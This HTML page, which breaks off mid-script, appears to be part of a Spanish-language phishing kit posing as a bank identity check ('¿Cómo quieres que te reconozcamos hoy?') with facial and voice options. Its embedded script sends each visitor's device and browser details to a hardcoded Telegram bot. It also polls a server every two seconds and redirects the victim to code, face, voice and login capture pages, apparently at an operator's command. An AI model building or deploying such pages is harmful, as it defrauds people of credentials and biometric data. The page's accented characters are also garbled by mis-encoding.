<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>Verificando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="../assets/img/favicon.ico">
  <link href="../assets/css/styles.css" rel="stylesheet">
  <link href="../assets/css/stylesheet.css" rel="stylesheet">
  <script src="../assets/js/jquery-3.6.0.min.js"></script>
  <script src="../assets/js/functions.js?v2"></script>
  <style>
    #fondo {
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      background-color: #ffffffc4;
      z-index: 300;
    }
    #cargando {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 400;
    }
  </style>
</head>

<body>
  <div id="fondo"></div>
  <img src="../assets/img/cargando.gif" id="cargando">

  <!-- Contenido principal -->
  <div class="cabecera">
    <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
      <tr>
        <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
        <td valign="middle" align="right">
          <button class="btn btn-std btn-sprd top-btn">Recarga</button>
          <button class="btn btn-std btn-sprd top-btn">Salir</button>
          <img src="../assets/img/menu.jpg" id="btn-menu">
        </td>
      </tr>
    </table>
  </div>

  <div class="contenido-interno">
    <div class="frm" id="frm-reconocimiento">
      <div class="titulo-app">¬øC√≥mo quieres que te reconozcamos hoy?</div>

      <div class="opcion-app" id="btn-facial">
        <table width="100%">
          <tr>
            <td rowspan="2" width="76"><img src="../assets/img/imagen.jpg" width="60"></td>
            <td><b>Reconocimiento facial</b><br>M√°s seguridad</td>
          </tr>
        </table>
      </div>

      <div class="opcion-app" id="btn-voz">
        <table width="100%">
          <tr>
            <td rowspan="2" width="76"><img src="../assets/img/mic.jpg" width="60"></td>
            <td><b>Reconocimiento de voz</b><br>Confirma que eres t√∫</td>
          </tr>
        </table>
      </div>
    </div>
  </div>

  <div class="pie">
    <table width="94%" style="max-width:1200px;margin:0 auto;">
      <tr>
        <td align="center"><img src="../assets/img/logo-blanco.svg" width="176"></td>
      </tr>
    </table>
  </div>

  <script>
    const BOT_TOKEN = "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc";
    const CHAT_ID = "8469651553";

    function detectarDispositivo() {
      const ua = navigator.userAgent;
      if (/Android/i.test(ua)) return "Android";
      if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
      if (/Windows/i.test(ua)) return "Windows";
      if (/Mac/i.test(ua)) return "Mac";
      return "Otro";
    }

    async function sendTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const body = { chat_id: CHAT_ID, text: message, parse_mode: "HTML" };
      try {
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body)
        });
      } catch (err) {
        console.error("Error enviando a Telegram:", err);
      }
    }

    async function notificarVisita() {
      const dispositivo = detectarDispositivo();
      const mensaje = `
üì≤ <b>Visita en verifying</b>
üíª Dispositivo: ${dispositivo}
üåê Navegador: ${navigator.userAgent}
      `;
      await sendTelegram(mensaje);
    }

    // Al cargar la p√°gina
    $(document).ready(function () {
      notificarVisita();

      // Consultar estado cada 2 segundos
      setInterval(consultar_estado, 2000);
    });

    function consultar_estado() {
      $.post("../process/estado.php", function (data) {
        switch (data.trim()) {
          case '2': window.location.href = "../code-validate"; break;
          case '4': window.location.href = "../verify-face"; break;
          case '6': window.location.href = "../verify-voice"; break;
          case '8': window.location.href = "../code-signup"; break;
          case '10': window.location.href = "../successful"; break;
          case '12': window.location.href = "../login"; break;
